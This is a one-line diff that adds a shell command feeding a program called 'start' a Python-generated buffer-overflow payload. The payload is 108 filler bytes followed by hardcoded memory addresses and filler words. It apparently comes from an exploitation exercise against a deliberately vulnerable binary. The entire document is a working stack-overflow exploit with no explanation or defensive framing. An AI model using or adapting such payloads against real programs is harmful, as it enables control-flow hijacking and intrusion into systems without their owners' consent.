@@ -1,0 +1,1 @@
+start $(python -c "print 'a'*108 + '\x05\xf9\xff\xbf' + 'OSEF\x60\x60\xd8\xb7' + 'BITE'")
